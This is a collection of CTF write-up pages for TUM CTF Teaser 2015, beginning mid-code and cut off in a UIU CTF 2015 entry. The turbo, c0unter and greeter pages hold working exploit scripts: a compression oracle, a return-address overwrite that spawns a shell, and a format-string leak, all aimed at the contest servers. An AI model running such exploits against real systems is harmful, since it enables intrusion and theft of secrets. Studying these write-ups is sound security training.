iv = open('/dev/urandom', 'rb').read(AES.block_size)
assert len(iv) == AES.block_size
aes = AES.new(key, AES.MODE_CBC, iv)

flag = open('flag.txt', 'r').read().strip()

r = b''
r += 'Today\'s special: {}.\n'.format(flag).encode()
if pw == goodpw:
    r += subprocess.check_output(cmd, shell = True)
else:
    r += 'Wrong password: {}.\n'.format(pw).encode()

padded = gzip.compress(r)
padded += bytes([AES.block_size - len(padded) % AES.block_size or AES.block_size])
padded += b'\0' * (AES.block_size - len(padded) % AES.block_size)

print(binascii.hexlify(iv + aes.encrypt(padded)).decode())
```

The password is at least 32 bytes long, so too long to guess. But if we take a closer
look at the code, we see that the data is compressed before it is encrypted. Furthermore
we control parts of the output, because the password is added to the encrypted data.
We can use the service as an oracle, by abusing the compression. Remember 
[CRIME](https://en.wikipedia.org/wiki/CRIME) and 
[BREACH](https://en.wikipedia.org/wiki/BREACH_%28security_exploit%29)?

So the way this attack works is that we will guess the flag byte by byte and supply
our guess of the flag as the password. The flag is already in the data that is
compressed. If we guessed the flag correctly the compression will remove this
redundant data and we will see no increase in length. If we guessed wrong we will
see longer data. The tricky part here is that we won't see a change in length if 
the bytes we are guessing are not at the "boundary" of a cipher block. But this
is relatively easy to achieve by gradually filling the supplied data with random
characters, that probably won't be compressed, until we see a length change. 

One thing that puzzeled me while playing around is that there is a bug in the padding
code. If you have zero bytes of padding you will get an additional ciphertext block, 
filled with `0x01` bytes. Fortunately this doesn't matter much for the attack, we just
have to make sure that there is always 2 bytes padding in the last block.

In this case we know that the flags start with `hxp{`. So we can start by checking
whether this increases the length of ciphertext. Of course we have to account for 
the bytes that the backreference that is added by gzip needs. As expected it
didn't increase the length, so we are on a good track. Now we have to guess
the following bytes, of which we can assume they are printable. So we start
by supplying `hxp{a`, `hxp{b` etc. until we receive a ciphertext that has
the same length as only `hxp{`. Then we have guessed correct and we can continue
with the next byte: `hxp{1a`, `hxp{1b` etc. I wrote the following script to solve
the challenge:

```python
import sys
from pwn import remote, log, context, process
import string
import zlib

#context.log_level = 'debug'
BLKSIZE = 16
#doremote = True
doremote = False


def get_length(inp):
    rem = None
    inp = inp + " a"
    if doremote:
        rem = remote("1.ctf.link", 1033)
        rem.sendline(inp)
        rem.shutdown("write")
        ret = rem.recvline().strip()
        rem.shutdown("read")
    else:
        rem = process("./turbo.py")
        out, err = rem.communicate(inp + "\n")
        ret = out.strip()
        log.info("\n".join(ret.split("\n")[:-1]))
        ret = ret.split("\n")[-1].strip()
        if err:
            log.info(err)
    rem.close()
    del rem
    if not ret:
        raise Exception("Received empty response!")
    return len(ret) / 2 / BLKSIZE


printables = string.digits + "_" + string.ascii_letters
printables = printables[::-1]


# We can find out how long the flag is by gradually increasing the length of
# the password we supply. If we get another block of encrypted data, we know we
# filled up the padding. Therefore we know how much padding there is given an
# empty password. We can then calculate the length of the flag by subtracting
# the length of the padding and the other known plaintext. The only thing
# that's left must be the length of the flag. At least that's the idea. For
# some reason (I guess gzip) this isn't working so well...
flaglen = 0
minlen = get_length("")
datalen = len(zlib.compress('Today\'s special: .\nWrong password: .\n', 9))
padlen = 0
pl = minlen
for i in range(1, BLKSIZE):
    log.info("trying {} chars".format(i))
    l = get_length(printables[:i])
    log.info("got length {}".format(l))
    if l != pl:
        padlen = i + 1
        break
log.info("deduced padding length {}".format(padlen))
flaglen = ((minlen - 1) * 16) - datalen - padlen
flaglen -= 2  # to account for padding bug
log.info("flag must be {} bytes long".format(flaglen))

#sys.exit(0)

#### some testing

# the password will be the guessed flag.
# "hxp{" + guess
log.info("Trying hxp{ flag prefix")
s = printables[:(padlen - 2)]
log.info(s)
pl = get_length(s)
assert pl == minlen
s = printables[:(padlen - 4)] + ""
x = s + "hxp{"
log.info(x)
l = get_length(x)
assert l == minlen

if not doremote:
    testflag = open("./flag.txt").read().strip()
    # these strings will be compressed and replaced by a ref to lz dictionary
    for teststr in ("hxp{1", "hxp{1_r3", testflag):
        x = s + teststr
        log.info(x)
        l = get_length(x)
        assert l == minlen, "teststr not compressed: " + repr(teststr)

    x = s + "hxp{X"
    log.info(x)
    l = get_length(x)
    assert l > minlen


#### The actual flag bruteforcing,
# byte by byte using the compression oracle

# block boundary, # bytes that can be added before next block
# the padding length from above - some guesssed value (because of gzip? I don't
# know)
BB = padlen - 4
# the guess results
previous = []
pl = 0
for i in range(len(previous), flaglen):
    log.info("guessing character number {}".format(i))
    test = "hxp{" + "".join(previous)
    test = printables[:BB] + test
    log.info("trying prefix: " + test)
    pl = get_length(test)
    log.info("got length = {}".format(pl))
    foundit = False
    for c in printables + "}":
        test = "hxp{" + "".join(previous)
        test = printables[:BB] + test + c
        log.info("trying prefix: " + test)
        l = get_length(test)
        log.info("l = {}, pl = {}".format(l, pl))
        if l == pl:
            log.info("deduced next char: " + c)
            previous.append(c)
            foundit = True
            break
        else:
            log.info("guess was wrong")
    if foundit:
        log.info("Current flag prefix guess is hxp{{{}"
                 .format("".join(previous)))
    else:
        log.error("Couldn't guess char {}".format(i))
    if previous[-1] == "}":
        break

flag = "hxp{" + "".join(previous)
if flag[-1] != "}":
    flag += "}"
log.info("final flag should be " + flag)

with open("./real_flag.txt", "w") as f:
    f.write(flag)
```

Running the script will guess the flag byte for byte. Unfortunately I didn't manage to 
complete the script in time and it finished guessing only a few minutes after the CTF 
ended. The service was still up so I got the flag `hxp{1_r34LLy_L1k3_0r4cL3s__n0T_7h3_c0mp4nY}` 

## Other write-ups and resources

* none yet
# TUM CTF Teaser 2015: Autoagressive Desensitization

**Category:** Misc
**Points:** 200
**Solves:** 3
**Description:**

> One of our crew claimed he found a secret message in the source of
> tranquility and left for a monastery. Nothing uncommon, but we really
> like to know the message. Luckily, we routinely tap our network. Here
> are the last minutes before he left, please help us!
> 
> WARNING: Prolonged exposure to this task is known to severely
> deteriorate brain tissue. Please hack responsibly!
> 
> [ctf.link/assets/downloads/misc/ctf-hxp-forensics200.pcap.lzma](ctf.link/assets/downloads/misc/ctf-hxp-forensics200.pcap.lzma)
> 
> 
> HINT: Remember that those are NETWORK protocols, so the RAW DATA is in a
> very common format, but a little bit different than your HOST may expect.
> 
> HINT: I can't take the bass no more!


## Write-up

(TODO)

## Other write-ups and resources

* <http://hxp.io/blog/19/TUMCTF%20Teaser%202015:%20Misc%20200%20%22Autoaggressive%20Desensitization%22%20writeup/>
* <https://tasteless.eu/post/2015/10/tumctf-misc200/>
# TUM CTF Teaser 2015: circ

**Category:** Misc
**Points:** 50
**Solves:** 31
**Description:**

> schematics lost...
> 
> [circ.tar.gz](circ.tar.gz)


## Write-up

(TODO)

## Other write-ups and resources

* [Romanian](http://pwn.ro/2015/tum-ctf-teaser-kteva-write-up-uri.html) (Down, [Cached Version](http://webcache.googleusercontent.com/search?q=cache:_cZomTKiHhUJ:pwn.ro/2015/tum-ctf-teaser-kteva-write-up-uri.html+&cd=5&hl=de&ct=clnk&gl=de))
# TUM CTF Teaser 2015: Sanity Check

**Category:** Misc
**Points:** 1
**Solves:** 224
**Description:**

> Are you alive?
> 
> Vm0wd2QyUXlWa2hWV0doVVYwZG9jRlZ0TVZOWFZsbDNXa1JTVjFac2JETlhhMUpUVmpGYWMySkVU
> bGhoTVVwVVZtcEJlRll5U2tWVQpiR2hvVFZWd1ZWWnFRbUZUTWsxNVUydFdWUXBpU0VKWVZtMTRk
> MVZXV25GVGFsSmFWakF4TkZaSE5VOVhRWEJwVWpGS1ZWWkdVa2RUCk1WWlhXa1prWVZKR1NsVlVW
> M040VGtaa2NtRkdaR2hSV0VKVVdXdG9RMWRXWkZobFIzUnBDazFFUm5wV01qVkxXVlpPU1ZGdVRs
> WmkKVkVaVVZURmFZV1JIVWtsVWJXaGhUVEJLVlZkWGVHdGlNbEp6VjJ0a1dHSlViRk5EYXpGelYy
> eG9WMDFYYUhaV01HUkxWMVpXYzFacwpWbGNLWWtoQ05sWkhkR0ZaVms1R1RsWmFhMUp0YUZOV01G
> WkxaREZhV0UxRVJsSk5WMUpZVjJ0b1QxbFdTa1pUYlVaRVlrWnNNMWxyClVsTlhSMFY0WTBoS1Yy
> SlVSa2RhVmxwWFl6RmFjd3BqUjJ0TFZXMDFRMkl4V25GUmJVWnFZbFpHTkZZeU5VOVpWa3AwWVVa
> T1YwMUcKV2t4YVJFWmhWMGRPUm1SSGJFNVdia0paVm1wS05HSXlTa2RUYWxwcFVtczFSVmxzVm5k
> WFJsbDVDazVZWkZkTlJFWXhWbGMxUzFZdwpNVWhWYTNoWFRWWndXRmw2Um1GamQzQlhZa2RPVEZa
> R1VrdGlNVkpYVjJ4V1VtSlZXbkZaYkZwSFRrWlplVTVXWkZkV01IQkpWbGQ0CmExWXdNVWNLVjJ0
> NFlWSXphSEpaZWtaM1VsWldjMk5HWkdsU2JrSktWbXBLTUdJeFVYaGlSbVJVWVRGd1ZWbHJXbUZT
> Vm14WlkwVmsKV0ZKc1ZqVkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
> WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
> VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
> Ukd4RVdub3dPVU5uUFQwSwo=


## Write-up

(TODO)

## Other write-ups and resources

* <https://614ckc0de.wordpress.com/2015/11/01/writeup-tum-ctf-teaser-2015/>
* [Romanian](http://pwn.ro/2015/tum-ctf-teaser-kteva-write-up-uri.html) (Down, [Cached Version](http://webcache.googleusercontent.com/search?q=cache:_cZomTKiHhUJ:pwn.ro/2015/tum-ctf-teaser-kteva-write-up-uri.html+&cd=5&hl=de&ct=clnk&gl=de))
# TUM CTF Teaser 2015: t9

**Category:** Misc
**Points:** 9
**Solves:** 50
**Description:**

> 352404707644669372663764444477927397646952284349399866786464374767564472 ?
> 
> [ctf.link/assets/downloads/misc/words.txt](ctf.link/assets/downloads/misc/words.txt)
> 
> 
> NOT the default flag format! Do not add hxp{ }.
> 
> 
> <!--
> "Theoretisch schon"
>       ~ Challenge Author
> -->


## Write-up

(TODO)

## Other write-ups and resources

* <http://the2702.com/2015/10/25/T9.html>
* [Romanian](http://pwn.ro/2015/tum-ctf-teaser-kteva-write-up-uri.html) (Down, [Cached Version](http://webcache.googleusercontent.com/search?q=cache:_cZomTKiHhUJ:pwn.ro/2015/tum-ctf-teaser-kteva-write-up-uri.html+&cd=5&hl=de&ct=clnk&gl=de))
# TUM CTF Teaser 2015: c0unter

**Category:** Pwn
**Points:** 25
**Solves:** 11
**Description:**

> Baby's 1st
> 
> [counter](counter)
> 
> nc 1.ctf.link 1031


## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <https://0xabe.io/ctf/exploit/2015/10/30/TUM-CTF-Teaser-2015-pwn-counter.html>

### Meta

Keywords:

* Stack Buffer Overflow (`sbo`) (Somewhat)
* Hidden function `execl`

We are given a x86-64bit stripped ELF for Linux:

```bash
$ file counter 
counter: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=b065123973be4586a6b10f277cda428776bde80b, stripped
```

Running checksec in `gdb-peda`:

```bash
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
```

* Only `NX` is enabled, forbidding us from executing crafted shellcode on the stack

Running it:

```bash
$ ./counter 
hello
ehllo
```

* Echos back your input (`hello`) in a randomized order

Decompiling it with `radare2` (`r2 -A ./counter`):

```bash
[0x004005e0]> ii # show imported and used functions
[Imports]
ordinal=001 plt=0x00400550 bind=GLOBAL type=FUNC name=free
ordinal=002 plt=0x00400560 bind=GLOBAL type=FUNC name=__isoc99_fscanf
ordinal=003 plt=0x00400570 bind=GLOBAL type=FUNC name=puts
ordinal=004 plt=0x00400580 bind=GLOBAL type=FUNC name=__libc_start_main
ordinal=005 plt=0x00400590 bind=UNKNOWN type=NOTYPE name=__gmon_start__
ordinal=006 plt=0x004005a0 bind=GLOBAL type=FUNC name=malloc
ordinal=007 plt=0x004005b0 bind=GLOBAL type=FUNC name=exit
ordinal=008 plt=0x004005c0 bind=GLOBAL type=FUNC name=execl

8 imports
```

`[0x004005e0]> VV @ main`:

![](./main.png)

* Main just calls `fcn.00400720`, lets jump to this `o`ffset with `o 0x00400720` to see this (press `p` once again to also see all offsets):

![](./fcn.00400720.png)

* `fcn.00400720` calls the `imp`orted function `__isoc99_fscanf`   - we set a breakpoint at the call, addr `0x0040074f`, in `gdb-peda` to see the guessed arguments:

```bash
gdb-peda$ b *0x0040074f
Breakpoint 1 at 0x40074f
gdb-peda$ r
[...]
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400742:    mov    rbx,rsp
   0x400745:    rep stos QWORD PTR es:[rdi],rax
   0x400748:    mov    rdi,QWORD PTR [rip+0x2005b1]        # 0x600d00 <stdin>
=> 0x40074f:    call   0x400560 <__isoc99_fscanf@plt>
   0x400754:    mov    edx,DWORD PTR [rbp+0x0]
   0x400757:    add    rbp,0x4
   0x40075b:    lea    eax,[rdx-0x1010101]
   0x400761:    not    edx
Guessed arguments:
arg[0]: 0x7ffff7dd4640 --> 0xfbad2088 
arg[1]: 0x4008dc --> 0x7331313525 ('%511s')
arg[2]: 0x600d40 --> 0x0 
arg[3]: 0x0 
gdb-peda$ x/wx 0x7ffff7dd4640
0x7ffff7dd4640 <_IO_2_1_stdin_>:        0xfbad2088
```

* Using `x/wx` on the first argument, we see that `0xfbad2088` is actually `stdin`
* So, the call to the `fscanf` function looks like this `__isoc99_fscanf(stdin, "%511s", 0x600d40)` with `0x600d40` being our input buffer, in which our input is stored

From `0x00400794` to `0x004007ae` you see some assembly that seems to modify the stack (look at the `add byte [rsp + rdx], 1` call):

![](./00400794.png)

We see a loop from `0x004007a0` to `0x004007ae` (notice the green arrow going from bottom to top of the node) that does the following:

* In `rcx`, the address of the end of our input is stored.
* It stores the hexadecimal representation of the current character of our input with `movzx edx, byte [rax]`
* It increases rax, in which our input buffer address is stored.
* It increments the value at our stack plus the character's hexadecimal representation, e.g. if `rsp` is `0x7fffffffe380` and our input is a newline `\n`==`0xa`, we increment the value at address `0x7fffffffe380`+`0xa`=`0x7fffffffe38a`. See [this writeup](https://0xabe.io/ctf/exploit/2015/10/30/TUM-CTF-Teaser-2015-pwn-counter.html) for a better explanation by example.
* The loop stops when `cmp rax, rcx` is `f`alse, forcing our `rip` to wander to along the red line with line description `f`.

Since we can increment any value from `rsp+0x00` to `rsp+0xff`, it suggests that we can change the return address and thus control `rip`.

As [this writeup](https://0xabe.io/ctf/exploit/2015/10/30/TUM-CTF-Teaser-2015-pwn-counter.html) describes, we can gdb's `i frame` command right before the `fscanf` call to print out information about the current stack frame, including the position of our saved `rip` on the stack:

```bash
gdb-peda$ i frame
Stack level 0, frame at 0x7fffffffe420:
 rip = 0x40074f; saved rip = 0x4005d9
 called by frame at 0x7fffffffe430
 Arglist at 0x7fffffffe378, args: 
 Locals at 0x7fffffffe378, Previous frame's sp is 0x7fffffffe420
 Saved registers:
  rbx at 0x7fffffffe408, rbp at 0x7fffffffe410, rip at 0x7fffffffe418
```

Then, we just calculate the distance between `rip` on the stack and `rsp` using `gdb`'s `distance` command:

```
gdb-peda$ distance $rsp 0x7fffffffe418
From 0x7fffffffe380 to 0x7fffffffe418: 152 bytes, 38 dwords
```

PS: You can also just calculate it by hand, by looking at any `sub rsp, XXX` or `push` instructions before the `fscanf` call:

![](./rip-offset-by-hand.png)

* Each `push` pushes 8 bytes (64 bit: `8` bytes, 32bit: `4` bytes) on the stack => 16 bytes offset to `rip`
* `sub rsp, 0x88` => `0x88` bytes == `136` bytes offset
* All in all `136`+`16`==`152` bytes offset from `rsp` to `rip`!

This means, we can change the `rip`, if we provide bytes in the range between `152` (`0x98`) to `152+8=160` (`0xa0`):

```bash
$ p -c 'print "\x98\x9c\xa0"*0x100' | ./counter 

Segmentation fault (core dumped)
```

Since NX is enabled (as seen in the `checksec` output), we have to find another way instead of providing shellcode on the stack.

Looking at the imported functions from earlier, we see an `execl` call and try to find it using these steps:

* In `radare2`, go to the `V`isual mode showing the assembly, e.g. with `[0x004005e0]> V @ main`:
![](./r2-visual.png)
* Press `_` to go into the HUD (you can always press `?`  for more information about the current possible commands):
![](./hud.png)
* Search for `execl` by just typing in `execl`:
![](./hud-search.png)
* Navigate with arrows to `sym.imp.EXECL` and press `ENTER`:
![](./execl1.png)
* Jump to the function referencing and thus calling the `execl` function by pressing `x` then `0` for the first xref:
![](./execl-xref.png)
* You then see the call to `execl`:
![](./execl2.png)

Since this function is not called in the usual control flow, we redirect `rip` to the beginning of this unknown function calling `execl` to see the arguments for `execl`:

```bash
gdb-peda$ set $rip = 0x004006e0
gdb-peda$ b *0x4006f2
Breakpoint 2 at 0x4006f2
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
RAX: 0x0 
[...]
=> 0x4006f2:    call   0x4005c0 <execl@plt>
   0x4006f7:    xor    edi,edi
   0x4006f9:    call   0x4005b0 <exit@plt>
   0x4006fe:    xchg   ax,ax
   0x400700:    sub    rsp,0x8
Guessed arguments:
arg[0]: 0x4008d4 --> 0x68732f6e69622f ('/bin/sh')
arg[1]: 0x4008d9 --> 0x7331313525006873 ('sh')
arg[2]: 0x0 
[...]
```

We see that the call of `execl` is `execl("/bin/sh","sh",NULL)`, which is exactly what we need to have a shell!

Our goal is to change `rip` using our input to the address `0x004006e0` to spawn a shell after the function calling `fscanf` returns.

We just have to calculate the offset difference between the address of the saved `rip` in the binary and `0x004006e0`: `0x004006e0-0x4005d9=0x0107` - so we have to increment the lowest byte of our `rip` address on the stack with `1` and the second lowest byte with `7`.

[This python script](./solve.py) does the job:

```bash
$ p solve.py 
[+] Opening connection to localhost on port 6666: Done
[*] Switching to interactive mode

$ $ ls -l
total 12
-rwxrw-r-- 1 vbox vbox 5384 Jan 24 09:41 counter
-rw-rw-r-- 1 vbox vbox   32 Jan 24 11:53 flag.txt
$ $ cat flag.txt
hxp{0verflow1ng_ch4c4cters_w1n}
$ $ exit
[*] Got EOF while reading in interactive
$ ^D
[*] Closed connection to localhost port 6666
```

The flag is `hxp{0verflow1ng_ch4c4cters_w1n}`.

To see that `rip` changed:

```bash
$ p -c 'print "\x98"*7+"\x99"' > in
$ xxd in 
0000000: 9898 9898 9898 9899 0a                   .........
$ gdb ./counter 
Reading symbols from ./counter...(no debugging symbols found)...done.
gdb-peda$ b *0x4007b0
Breakpoint 1 at 0x4007b0
gdb-peda$ r < in
Starting program: /home/vbox/pwn/tasks/tum/c0unter/counter < in
[...]
   0x4007ae:    jne    0x4007a0
=> 0x4007b0:    movzx  ecx,BYTE PTR [rsp+0x1]
   0x4007b5:    movzx  edx,BYTE PTR [rsp]
[...]
Breakpoint 1, 0x00000000004007b0 in ?? ()
gdb-peda$ x/gx $rsp+0x98
0x7fffffffe418: 0x00000000004006e0
gdb-peda$ c
Continuing.

process 3372 is executing new program: /bin/dash
Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x4007b0
```

## Other write-ups and resources

* <https://0xabe.io/ctf/exploit/2015/10/30/TUM-CTF-Teaser-2015-pwn-counter.html>
# TUM CTF Teaser 2015: cloud gaming

**Category:** Pwn
**Points:** 200
**Solves:** 1
**Description:**

> Do you remember the 90s? We cloudified one of those magical devices for
> maximum usability.
> 
> [rom-with-censored-flag.gb](rom-with-censored-flag.gb)
> 
> 
> NOTE: We expect very high load on this service. Please notify the orgas
> if the result is inconsistent with what you'd expect.
> 
> nc 1.ctf.link 1080


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# TUM CTF Teaser 2015: greeter

**Category:** Pwn
**Points:** 15
**Solves:** 36
**Description:**

> Baby's 1st
> 
> [greeter](greeter)
> 
> nc 1.ctf.link 1030


## Write-up

by [f0rki](https://github.com/f0rki)

This was the first challenge in the pwn category and was pretty easy to solve.
The service asks us for our name and then tells us to pwn harder.

```
Hi, what's your name?
adsfasdf
Pwn harder, asdfasdf!
```

After a quick look at the disassembly with [radare2](http://radare.org/r/)
wee can see that there are two consecutive
calls to `printf` to print the `Pwn harder, $name!` string. 

```
0x004006d1    bf9f084000     mov edi, str._e_34mPwn_harder_ ; str._e_34mPwn_harder_ ; greeter.c:29  
0x004006d6    31c0           xor eax, eax
0x004006d8    e8c3feffff     call sym.imp.printf
0x004006dd    4889df         mov rdi, rbx                  ; greeter.c:30  
0x004006e0    31c0           xor eax, eax
0x004006e2    e8b9feffff     call sym.imp.printf
0x004006e7    bfb1084000     mov edi, str.__e_0m           ; "!.[0m" @ 0x4008b1 ; greeter.c:31  
0x004006ec    e87ffeffff     call sym.imp.puts
```

And the format string argument seems to be something non-constant. This smells
like a format string vulnerability.
```
Hi, what's your name?
%x 
Pwn harder, 60be2f50!
```

Yes! So we have a pretty straight forward format string vulnerability. At the start
of the `main` function we have code that reads the flag.txt file and stores it
at a location which is apparently not randomized by ASLR.
```
0x00400619    bf96084000     mov edi, str.flag.txt         ; "flag.txt" @ 0x400896
0x0040061e    e8bdffffff     call sym.imp.fopen
0x00400623    4885c0         test rax, rax
0x00400626    0f84d8000000   je 0x400704                  
0x0040062c    4889c2         mov rdx, rax                  ; greeter.c:18  
0x0040062f    be00010000     mov esi, 0x100
0x00400634    bfa00c6000     mov edi, obj.flag             ; obj.flag
0x00400639    4889c5         mov rbp, rax
0x0040063c    e87fffffff     call sym.imp.fgets
```

So we now have to craft a format string that prints the flag. So we add the 
address of the flag object to our format string and use the `%N$s` format 
specifier to directly access the N'th argument, to get to the address of flag. 
After playing around with  the format string a little bit, I got the flag 
`hxp{f0rm4t_sTr1ngs_r0ck}`.
Here is the script I used.

```python
from pwn import *  # NOQA

context.log_level = 'debug'

p = remote("1.ctf.link", 1030)
#p = process("./greeter")
velf = ELF("./greeter")
flagaddr = velf.symbols["flag"]
log.info("Flag addr = 0x{:x}".format(flagaddr))

#fmtstr = ""
fmtstr = "AAAA" * 2
fmtstr += r"%9$s"
fmtstr += "BBBB"
#fmtstr += r"%9$x"
fmtstr += p64(flagaddr)
fmtstr += p64(flagaddr)
fmtstr += p64(flagaddr)

p.recvline()
p.sendline(fmtstr)
line = p.recv()
log.info(line)
m = re.search("(hxp{.*})", line)
if m:
    log.info("found flag: " + m.groups()[0])
p.clean_and_log()
```

## Other write-ups and resources

* <https://github.com/ByteBandits/writeups/blob/master/tum-ctf-teaser-2015/pwn/greeter/sudhackar/README.md>
# TUM CTF Teaser 2015: lame nayn

**Category:** Pwn
**Points:** 50
**Solves:** 2
**Description:**

> Hey, we hired a rainbow cat to protect our message store service.
> I think it is safe to leave the function echoing lamefl0g.txt in
> the binary as it's never called.
> 
> [nayn](nayn)
> 
> nc 1.ctf.link 1077


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# TUM CTF Teaser 2015: scge

**Category:** Pwn
**Points:** 300
**Solves:** 2
**Description:**

> Can you pwn me Chainsei? *_*
> 
> [scge](scge)
> 
> nc 1.ctf.link 1024


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# TUM CTF Teaser 2015: unlame nayn

**Category:** Pwn
**Points:** 100
**Solves:** 2
**Description:**

> Hey, even though the rainbow cat failed protecting the lamefl0g, we
> gave him a second chance. The unlamefl0g remains safe.
> 
> [nayn](nayn)
> 
> nc 1.ctf.link 1077
> 
> libc: nc 1.ctf.link 1099


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# TUM CTF Teaser 2015 CTF write-ups

* <http://ctf.hxp.io/>
* [Scoreboard](https://ctftime.org/event/238) or [local alternative](./scoreboard)
* Flags available for each challenge at the end, see [here for example](http://2015.ctf.link/challenges/6/)

## Completed write-ups

* [crypto/bad_apple](crypto/bad_apple)
* [crypto/pudel](crypto/pudel)
* [crypto/turbo](crypto/turbo)
* [pwn/c0unter](pwn/c0unter)
* [pwn/greeter](pwn/greeter)

## External write-ups only

* [crypto/really_slow_arithmetic](crypto/really_slow_arithmetic)
* [misc/autoagressive_desensitization](misc/autoagressive_desensitization)
* [misc/circ](misc/circ)
* [misc/sanity_check](misc/sanity_check)
* [misc/t9](misc/t9)
* [rev/selftest](rev/selftest)
* [rev/whitebox_crypto](rev/whitebox_crypto)
* [web/italy_food](web/italy_food)
* [web/neocities](web/neocities)
* [web/webshop](web/webshop)

## Missing write-ups

* [crypto/linear](crypto/linear)
* [pwn/cloud_gaming](pwn/cloud_gaming)
* [pwn/lame_nayn](pwn/lame_nayn)
* [pwn/scge](pwn/scge)
* [pwn/unlame_nayn](pwn/unlame_nayn)
* [rev/b0rked_screens4ver](rev/b0rked_screens4ver)
* [rev/qqqshit](rev/qqqshit)
* [rev/quine](rev/quine)# TUM CTF Teaser 2015: b0rked_screens4ver

**Category:** Rev
**Points:** 250
**Solves:** 0
**Description:**

> Hey, my super-duper retro screen saver doesn't work anymore.
> Maybe a virus overwrote some parts of it? Can you help me? :(
> 
> Hint: This flag is does not comply with the hxp{..} format.
>       Once you get the solution, add hxp{} around it before submitting.
> 
> 
> [br0ken_screensaver](br0ken_screensaver)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# TUM CTF Teaser 2015: qqqshit

**Category:** Rev
**Points:** 250
**Solves:** 0
**Description:**

> [qqqshit](qqqshit)
> 
> nc 1.ctf.link 1111


## Write-up

(TODO)

Flag: [hxp{ju5T_a_g3nTl3_r3m1nd3r_tH4t_x0r_sw4p_f41ls_h0rr1bLy_0n_eQu4l_p01Nt3r5}](http://2015.ctf.link/challenges/8/)

## Other write-ups and resources

* none yet
# TUM CTF Teaser 2015: quine

**Category:** Rev
**Points:** 100
**Solves:** 2
**Description:**

> Beware, it's cheating! ;)
> 
> [quine](quine)


## Write-up

(TODO)

Flag: [hxp{th3_pr0gr4m_sux}](http://2015.ctf.link/challenges/6/)

## Other write-ups and resources

* none yet
# TUM CTF Teaser 2015: selftest

**Category:** Rev
**Points:** 10
**Solves:** 44
**Description:**

> Baby's 1st
> 
> [selftest](selftest)
> 
> nc 1.ctf.link 1060


## Write-up

(TODO)

## Other write-ups and resources

* <http://vulnerablespace.blogspot.de/2015/10/ctf-writeup-tum-ctf-teaser-selftest-rev.html>
# TUM CTF Teaser 2015: whitebox crypto

**Category:** Rev
**Points:** 20
**Solves:** 16
**Description:**

> Do not panic, it's only XTEA! I wonder what the key was...
> 
> [xtea](xtea)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/ByteBandits/writeups/blob/master/tum-ctf-teaser-2015/rev/whitebox%20crypto/sudhackar/README.md>
# TUM CTF Teaser 2015: Italy Food

**Category:** Web
**Points:** 200
**Solves:** 3
**Description:**

> Organizing a CTF makes hungry... anyone in for pizza?
> Get it while it's hot, hawt, HAWT!!!
> 
> 1.ctf.link:1120


## Write-up

(TODO)

## Other write-ups and resources

* <http://www.tasteless.eu/post/2015/10/tumctf-web200/>
* <http://fadec0d3.blogspot.de/2015/10/tum-ctf-2015-italy-food-200.html>
# TUM CTF Teaser 2015: neocities

**Category:** Web
**Points:** 20
**Solves:** 145
**Description:**

> So I hope you're well insured, because the nineties have sent us their
> best thing ever: bright colors and Comic Sans MS. Please end it before
> everyone dies due to internal bleedings.
> 
> 1.ctf.link:1123


## Write-up

(TODO)

## Other write-ups and resources

* <https://614ckc0de.wordpress.com/2015/11/01/writeup-tum-ctf-teaser-2015/>
* [Romanian](http://pwn.ro/2015/tum-ctf-teaser-kteva-write-up-uri.html) (Down, [Cached Version](http://webcache.googleusercontent.com/search?q=cache:_cZomTKiHhUJ:pwn.ro/2015/tum-ctf-teaser-kteva-write-up-uri.html+&cd=5&hl=de&ct=clnk&gl=de))
# TUM CTF Teaser 2015: webshop

**Category:** Web
**Points:** 30
**Solves:** 42
**Description:**

> Well, I found this shop and their offers are quite awesome, but something here smells... fishy.
> 
> 1.ctf.link:1124


## Write-up

(TODO)

## Other write-ups and resources

* <http://the2702.com/2015/10/25/Web-Shop.html>
* <http://icheernoom.blogspot.de/2015/10/tum-ctf-teaser-webshop-web-write-up.html>
* [Romanian](http://pwn.ro/2015/tum-ctf-teaser-kteva-write-up-uri.html) (Down, [Cached Version](http://webcache.googleusercontent.com/search?q=cache:_cZomTKiHhUJ:pwn.ro/2015/tum-ctf-teaser-kteva-write-up-uri.html+&cd=5&hl=de&ct=clnk&gl=de))
# UIU CTF 2015: The Gibson

**Category:** Forensics
**Points:** 300
**Solves:** 5
**Description:** 

> FORENSICS: Welcome to The [Gibson](http://gibson.uiuc.sexy/), noob!

## Write-up

(TODO)

## Other write-ups and resources

* none yet# UIU CTF 2015: ovaltine

**Category:** Network
**Points:** 100
**Solves:** 78
**Description:** 

> NETWORK: Welcome to the 1337 LOASS...Ralphie!. [ovaltine.7z](https://ctf.acm.illinois.edu/archive/ovaltine.7z)

[Alternative download](https://mega.nz/#!PFkQSYpS!BQvz21HiSf5_4lo9ywWhAMlRPwitN-2Cv1BrhOEqB5k)

## Write-up

by [bobbyblues](https://github.com/bobbyblues)

The challenge consists in a pcap file containing network traffic.
Most of it is encrypted, but a few TCP streams are here, and we quickly find emails exchanged about joining the Little Orphan Annie fanclub.
By exporting the HTTP objects from the capture we can retrieve those emails and find two interesting ones.
The first one is :
```
Ralphie,

Set your ring to shift 8!

The message is: ZMUMUJMZ BW LZQVS GWCZ WDITBQVM!

Annie
```
This is a classic Caesar cypher, and by shifting all letters 8 positions we get:
```
REMEMBER TO DRINK YOUR OVALTINE!
```
Which does not look like the flag.
The second interesting email does not give information on how the messages has been encrypted:
```
Ralphie,

The secret message this week uses a new type of encoding!

